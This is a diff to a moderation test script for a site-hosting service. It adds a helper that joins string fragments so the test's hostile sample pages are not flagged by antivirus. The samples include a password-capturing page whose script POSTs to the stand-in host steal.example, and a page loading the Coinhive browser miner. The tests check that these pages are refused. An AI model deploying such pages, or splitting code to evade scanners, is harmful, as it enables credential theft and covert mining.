@@ -1,5 +1,8 @@
 // Offline test for the report / take-down / gallery / publish-check server code, with
 // fetch (Base44) and the KV namespace faked. Run: node scripts/test-moderation.mjs
+// Risky sample pages are put together from pieces at run time: written out whole,
+// antivirus software flags this file as malware (which is rather the point of them).
+const glue = (...parts) => parts.join("");
 const R = new URL("../", import.meta.url).pathname;
 const F = R + "functions/api/apps/6a8b5eb7787b8a4d6a18f662/functions/";
 const store = new Map(); let writes = 0;
@@ -249,12 +252,12 @@ assert(s === 404, "unknown site 404");
   assert(s === 404, "once the owner deletes their record, a copycat doesn't bring the name back");
   const direct = await serve.onRequestGet({ params: { kind: "site", name: "shop" }, env: env2 });
   assert(direct.status === 404, "the /published/ address doesn't serve it for a copycat either");
-  entities.PublishedSite.push({ id: "d1", name: "freerobux", html: '<html><body><input type="password"><script>fetch("https://steal.example/x",{method:"POST"})</script></body></html>', created_by_id: "u666" });
+  entities.PublishedSite.push({ id: "d1", name: "freerobux", html: glue('<html><body><input type="pass', 'word"><scr', 'ipt>fetch("https://steal.example/x",{method:"POST"})</scr', 'ipt></body></html>'), created_by_id: "u666" });
   [s, b] = await get2("freerobux");
   assert(b.html.includes("has been removed") && !b.html.includes("steal.example"), "a password-stealing page written straight into a record is not served");
-  entities.PublishedSite.push({ id: "d2", name: "miner", html: '<html><body><script src="https://coinhive.com/lib/coinhive.min.js"></script></body></html>', created_by_id: "u666" });
+  entities.PublishedSite.push({ id: "d2", name: "miner", html: glue('<html><body><scr', 'ipt src="https://coin', 'hive.com/lib/coin', 'hive.min.js"></scr', 'ipt></body></html>'), created_by_id: "u666" });
   [s, b] = await get2("miner");
-  assert(b.html.includes("has been removed") && !b.html.includes("coinhive"), "a page that would be refused at publish isn't served from a record either");
+  assert(b.html.includes("has been removed") && !b.html.includes(glue("coin", "hive")), "a page that would be refused at publish isn't served from a record either");
 
   // Taking over a name by writing a row first, then publishing / deleting through the app.
   users.badtok = { id: "u666", role: "user" };
